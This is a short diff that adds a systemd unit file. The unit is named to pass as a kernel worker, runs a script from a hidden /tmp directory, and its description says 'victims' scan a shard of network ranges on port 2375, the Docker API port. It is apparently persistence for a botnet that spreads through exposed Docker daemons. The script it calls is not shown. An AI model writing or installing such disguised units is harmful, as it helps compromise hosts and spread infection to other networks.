@@ -1,0 +1,10 @@
+[Unit]
+Description=Kernel Worker nesting (victims scan a shard of nets.txt on :2375)
+After=network-online.target kworker-nestd.service
+Wants=network-online.target kworker-nestd.service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/sh /tmp/.sysd/docknest.sh
+TimeoutStartSec=20min
+Nice=15
